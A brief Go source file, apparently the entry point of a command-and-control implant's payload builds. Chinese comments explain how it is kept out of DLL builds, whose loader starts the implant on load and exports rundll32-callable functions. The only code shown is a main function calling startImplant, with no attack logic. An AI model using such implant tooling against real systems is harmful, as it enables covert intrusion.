//go:build !shared

package main

// 可执行文件入口（exe / raw / bin / 服务端嵌入的载荷）。
//
// **注意**：这个文件用 `!shared` 标签排除在 DLL 构建之外 —— DLL（`-buildmode=c-shared`）
// 的入口是生成的 cgo 胶水（见 internal/server/builder/dll.go：DLL 加载即 `go startImplant()`，
// 同时导出可供 rundll32 调用的函数），两条路都调用同一个 `startImplant()`。
// 如果不排除，c-shared 构建里会出现两个 `func main()` 而编译失败（v1.3.5 及以前
// 就是因为这个原因，`format=dll` 实际上被 CGO_ENABLED=0 静默跳过、只产出一个改名的 EXE）。
func main() {
	startImplant()
}
